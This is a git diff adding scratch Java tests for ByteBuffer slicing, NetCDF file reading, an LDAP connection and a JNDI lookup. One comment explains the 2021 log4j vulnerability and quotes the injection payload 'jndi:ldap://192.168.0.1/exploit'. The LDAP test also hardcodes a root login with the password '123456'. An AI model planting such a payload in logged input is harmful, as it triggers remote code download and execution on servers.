@@ -19,6 +19,7 @@ import com.google.gson.Gson;
 import com.google.gson.annotations.SerializedName;
 import com.google.gson.reflect.TypeToken;
 import com.googlecode.aviator.AviatorEvaluator;
+import com.novell.ldap.*;
 import eu.bitwalker.useragentutils.UserAgent;
 import freemarker.template.Configuration;
 import freemarker.template.Template;
@@ -39,13 +40,20 @@ import org.apache.commons.lang3.time.DateFormatUtils;
 import org.junit.Assert;
 import org.junit.Test;
 import org.slf4j.MDC;
+import org.springframework.jndi.JndiObjectTargetSource;
+import org.springframework.jndi.JndiTemplate;
 import org.springframework.util.CollectionUtils;
 import org.springframework.util.LinkedMultiValueMap;
 import org.springframework.util.MultiValueMap;
 import org.springframework.util.ObjectUtils;
 import org.springframework.web.servlet.view.freemarker.FreeMarkerConfigurer;
 import org.stringtemplate.v4.ST;
+import ucar.ma2.*;
+import ucar.nc2.*;
 
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
 import javax.validation.ConstraintViolation;
 import javax.validation.Validation;
 import javax.validation.Validator;
@@ -61,6 +69,7 @@ import java.lang.reflect.Field;
 import java.lang.reflect.Modifier;
 import java.math.BigDecimal;
 import java.net.SocketTimeoutException;
+import java.nio.ByteBuffer;
 import java.security.KeyFactory;
 import java.security.PublicKey;
 import java.security.spec.KeySpec;
@@ -78,7 +87,6 @@ import java.util.regex.Pattern;
 import java.util.stream.Collectors;
 import java.util.stream.IntStream;
 
-import static java.util.concurrent.Executors.newFixedThreadPool;
 
 @Slf4j
 public class TempTest {
@@ -1299,6 +1307,205 @@ public class TempTest {
             System.out.println(count++);
         }
     }
+
+    public @Test void test85(){
+        byte[] bytes = new byte[]{1,2,3,4,5};
+        ByteBuffer byteBuffer = ByteBuffer.wrap(bytes);
+        //使用slice之前，一般先调用position()和limit()方法，
+        byteBuffer.position(2);
+        // 2 5 5
+        log.info("position:{},limit:{},capacity:{}", byteBuffer.position(), byteBuffer.limit(), byteBuffer.capacity());
+
+        ByteBuffer byteBuffer1 = byteBuffer.slice();
+        // 12345->345
+        log.info("position:{},limit:{},capacity:{}", byteBuffer.position(), byteBuffer.limit(), byteBuffer.capacity());
+        log.info("position:{},limit:{},capacity:{}", byteBuffer1.position(), byteBuffer1.limit(), byteBuffer1.capacity());
+        byteBuffer1.put((byte)6);
+        for (int i = 0; i < bytes.length; i++) {
+            System.out.print(bytes[i]);
+        }
+        //使用slice()后，再调用arrayOffset()方法时，会出现返回值非0的情况
+        //其是对原缓冲区的偏移
+        log.info("offset:{}", byteBuffer1.arrayOffset());
+    }
+
+    public @Test void test86(){
+        byte[] bytes = new byte[]{1,2,3,4,5};
+        ByteBuffer byteBuffer = ByteBuffer.wrap(bytes);
+        //使用slice之前，一般先调用position()和limit()方法，
+        byteBuffer.position(0);
+        ByteBuffer slice = byteBuffer.slice();
+        slice.position(0);
+        for(int i=0;i<bytes.length;i++){
+            System.out.println(slice.get(i));
+        }
+    }
+    public @Test void test87(){
+        ByteBuffer writeBuffer = ByteBuffer.allocateDirect(16);
+        byte[] bytes = new byte[]{1,2,3,4,5};
+        writeBuffer.put(bytes);
+        System.out.println("first position:"+writeBuffer.position());
+        byte[] bytes1 = new byte[]{6,7};
+        // 每次put，post+=bytes1.length
+        writeBuffer.put(bytes1);
+        System.out.println("second position:"+writeBuffer.position());
+        writeBuffer.position(0);
+        // slice 片段：post为writeBuffer的post位置
+        ByteBuffer slice = writeBuffer.slice();
+        System.out.println("slice position:"+writeBuffer.position());
+        System.out.println("slice limit:"+writeBuffer.limit());
+        System.out.println("slice capacity:"+writeBuffer.capacity());
+        slice.position(0);
+//        slice.limit(bytes.length);
+//        System.out.println(slice.limit());
+        for(int i=0;i<7;i++){
+            System.out.println(slice.get(i));
+        }
+    }
+    public @Test void test88(){
+        ByteBuffer writeBuffer = ByteBuffer.allocateDirect(16);
+        ByteBuffer slice = writeBuffer.slice();
+        byte[] bytes = new byte[]{1,2,3,4,5};
+
+        slice.put(bytes);
+        for(int i=0;i<5;i++){
+            System.out.println(writeBuffer.get(i));
+        }
+        System.out.println(writeBuffer.position());
+
+    }
+    public @Test void testNCIO(){
+        // fixme https://mvnrepository.com/artifact/edu.ucar/netcdfAll/4.6.16.1
+        // 自行下载jar包，加入的classpath中
+        String filename = "/Users/didi/Downloads/12981977/2018/NIRv.GPP.201809.v1.nc";
+        NetcdfFile dataFile = null;
+        try {
+            dataFile = NetcdfFile.open(filename);
+            // Get the latitude and longitude Variables.
+            Variable latVar = dataFile.findVariable("latitude");
+            Variable lonVar = dataFile.findVariable("longitude");
+            Variable gppVar = dataFile.findVariable("GPP");
+            long size = latVar.getSize();
+            System.out.println("size:"+size);
+            System.out.println("size:"+lonVar.getSize());
+            System.out.println("size:"+gppVar.getSize());
+            DataType dataType = gppVar.getDataType();
+            System.out.println("dataType:"+dataType);
+            Array read = gppVar.read();
+            IndexIterator indexIterator = read.getIndexIterator();
+            while (indexIterator.hasNext()){
+                short shortNext = indexIterator.getShortNext();
+                if(shortNext==-9999||shortNext==0){
+                    continue;
+                }
+                System.out.println(shortNext);
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+            return;
+
+        } finally {
+            if (dataFile != null)
+                try {
+                    dataFile.close();
+                } catch (IOException ioe) {
+                    ioe.printStackTrace();
+                }
+        }
+    }
+
+    /**
+     * LDAP:Light directory access protocol 轻量级目录访问协议
+     * 实现，如Novell
+     * dc(Domain Component)，uid(User Id)，ou(Organization Unit)，cn(Common Name)，sn(Surname)，
+     * dn(Distinguished Name)，rdn(Relative dn)
+     *
+     * 比如查询一个树上的苹果：
+     * 树（dc=ljheee)
+     * 分叉（ou=bei,ou=xi,ou= dong）
+     * 苹果（cn=redApple）
+     *
+     * ref:https://www.iteye.com/blog/leonandjava-317800
+     */
+    public @Test void testLDAP() throws LDAPException {
+        LDAPConnection ldapConnection = new LDAPConnection();
+
+        LDAPAttribute attribute = null;
+
+        LDAPAttributeSet attributeSet = new LDAPAttributeSet();
+        String ldapHost = "127.0.0.1";
+        int ldapPort = 9990;
+        ldapConnection.connect(ldapHost, ldapPort);
+
+        // authenticate to the server
+
+        int ldapVersion = 10;
+        String loginDN = "root";
+        byte[] password = "123456".getBytes();
+        ldapConnection.bind(ldapVersion, loginDN, password);
+        String dn = "cn=JSmith," + "dc=ljheee,ou=bei,ou=xi,ou=dong,cn=redApple";
+
+        LDAPEntry newEntry = new LDAPEntry(dn, attributeSet);
+
+        ldapConnection.add(newEntry);
+
+        System.out.println("\nAdded object: " + dn + " successfully.");
+
+        // disconnect with the server
+        ldapConnection.disconnect();
+
+
+    }
+    // ref:https://mp.weixin.qq.com/s/FouhOPacCOMYq153xaw-3A
+    // 2021-12-11 log4j 漏洞
+    // 原理：黑客可以通过日志中输入jndi:ldap://192.168.0.1/exploit,通过ldap协议远程下载恶意攻击代码到本地服务器上，执行代码，攻击服务器
+    /**
+     * Java Naming and Directory Interface：Java命名和目录接口
+     * ref:https://tomcat.apache.org/tomcat-8.5-doc/jndi-resources-howto.html
+     */
+    public @Test void testJDNI() throws NamingException {
+
+        class MyBean{
+            private String foo = "Default Foo";
+
+            public String getFoo() {
+                return (this.foo);
+            }
+
+            public void setFoo(String foo) {
+                this.foo = foo;
+            }
+
+            private int bar = 0;
+
+            public int getBar() {
+                return (this.bar);
+            }
+
+            public void setBar(int bar) {
+                this.bar = bar;
+            }
+
+        }
+
+        // spring中的JDNI实现
+        JndiTemplate jndiTemplate=new JndiTemplate();
+        JndiObjectTargetSource source=new JndiObjectTargetSource();
+
+        Context initCtx = new InitialContext();
+        Context envCtx = (Context) initCtx.lookup("java:comp/env");
+        MyBean bean = (MyBean) envCtx.lookup("bean/MyBeanFactory");
+
+        System.out.println("foo = " + bean.getFoo() + ", bar = " +
+                bean.getBar());
+
+    }
+    public @Test void testLocale(){
+        Locale aDefault = Locale.getDefault();
+        System.out.println(aDefault.getDisplayName());
+    }
+
+    public @Test void test(){}
 
 
 
